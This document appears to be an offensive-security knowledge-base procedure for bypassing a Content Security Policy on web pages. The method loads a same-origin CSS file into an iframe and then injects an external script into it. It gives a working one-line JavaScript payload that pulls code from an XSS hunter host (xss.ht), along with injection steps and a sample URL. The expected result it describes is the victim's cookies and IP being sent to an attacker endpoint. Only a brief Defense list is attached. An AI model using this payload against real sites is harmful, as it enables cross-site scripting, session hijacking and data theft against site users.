---
type: procedure
description: >-
  Bypass Content Security Policy (CSP) restrictions on inline scripts and eval
  by leveraging an iframe sourced from a CSS file to execute external malicious
  JavaScript.
verified: true
submitted: false
created_at: '2023-04-06T03:56:43.240987+00:00'
updated_at: '2023-04-10T20:21:38.838951+00:00'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - csp-bypass
  - xss
  - javascript
commands: []
platforms:
  - Web
tools: []
validated: true
---

# CSP-Bypass-Using-Inline-Scripts-and-Eval

## Summary

This procedure demonstrates how to bypass Content Security Policy (CSP) protections that block inline scripts and eval() functions by creating an iframe that inherits a more permissive policy from a CSS resource, allowing the injection and execution of external malicious JavaScript for cross-site scripting (XSS) attacks.

## Description

Content Security Policy (CSP) is a browser security mechanism that restricts the sources from which content like scripts can be loaded, often blocking inline <script> tags and the use of eval() to prevent XSS. This bypass exploits the fact that iframes sourcing same-origin resources like CSS files can have a more lenient effective policy, enabling inline script execution within the iframe context. Once bypassed, attackers can load and execute arbitrary JavaScript from external hosts (e.g., XSS hunting services), leading to session hijacking, data theft, or further exploitation. This technique is effective against CSP headers like 'script-src 'self'' without 'unsafe-inline' or 'unsafe-eval', and is commonly used in reflected or stored XSS scenarios on web applications.

## Requirements

1. A reflected or stored XSS vulnerability in the target web application where JavaScript can be injected (e.g., via unsanitized user input in a search field or comment section).
2. The target page must load at least one CSS file from the same origin to source the iframe.
3. Access to an external domain for hosting the malicious payload, such as an XSS hunter service like xss.ht.
4. Browser developer tools or a proxy like Burp Suite to test and verify injection.

## Defense

- Implement a strict CSP policy explicitly disallowing 'unsafe-inline', 'unsafe-eval', and external script sources; use nonces or hashes for allowed inline scripts.
- Sanitize all user inputs to prevent XSS injection points, using libraries like DOMPurify.
- Deploy a Web Application Firewall (WAF) to detect and block suspicious JavaScript patterns, such as iframe creations sourcing CSS or external script appends.
- Enable Content-Security-Policy-Report-Only mode for monitoring violations before enforcement.

## Objectives

1. Identify an XSS injection point in a CSP-protected application.
2. Craft and inject a JavaScript payload that bypasses CSP via an iframe trick to execute external code.
3. Verify successful execution by capturing callbacks from the malicious script.

## Instructions

### Step 1: Identify the XSS Injection Point and Verify CSP

**Context**: Locate a vulnerability allowing JavaScript injection and confirm CSP blocks direct inline scripts or eval. This ensures the bypass is necessary.

Inspect the target page's HTTP headers for CSP directives (e.g., via browser dev tools Network tab). Test a simple alert payload like `<script>alert(1)</script>`; if blocked, proceed to bypass.

**Expected Output**: CSP header visible in response (e.g., Content-Security-Policy: script-src 'self'), and simple inline script execution fails with a console error like "Refused to execute inline script because it violates the following Content Security Policy directive."

### Step 2: Craft the Bypass Payload Using the Iframe Technique

**Context**: Use the provided JavaScript code snippet to create an iframe sourcing a CSS file, which allows inline execution in the iframe's context, then append an external script.

Reference the code snippet [[codes/JavaScript-CSP-Bypass-Using-Iframe-and-Timeout]]. Substitute the placeholder for your XSS hunter username (e.g., replace [YOUR_XSSHUNTER_USERNAME] with 'yourusername').

Embed the payload in the XSS vector, such as a URL parameter or form input.

**Code** ([[codes/JavaScript-CSP-Bypass-Using-Iframe-and-Timeout]]):

```js
// CSP Bypass with Inline and Eval
d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
```

> This code creates an iframe ('f') sourcing the first CSS link on the page, appends it to the body, creates a script element ('s') pointing to the external malicious URL, and after a 1-second delay (to ensure iframe load), appends the script to the iframe's head. The iframe's context permits the inline operations, bypassing the parent's CSP.

If no CSS link exists, adapt by sourcing another same-origin resource like an image.

**Expected Output**: No CSP violation errors in console; iframe appears (may be invisible), and external script loads successfully.

### Step 3: Inject the Payload and Verify Execution

**Context**: Deliver the payload via the XSS vector and monitor for successful callback to confirm bypass.

Inject the crafted payload into the vulnerable input (e.g., append to a URL: http://target.com/search?q=<script>[payload]</script>). Use a proxy to intercept and modify if needed. Monitor the XSS hunter dashboard for incoming requests.

If testing locally, replace the src with a benign alert: s.src="javascript:alert('Bypass Success')".

**Expected Output**: Callback received on xss.ht (e.g., victim IP, user-agent, cookies captured), or alert fires in the iframe context.

**Success Indicators**:
- No CSP block errors for the injected script.
- External script executes, sending data to attacker-controlled endpoint.
- Console shows iframe load without violations.
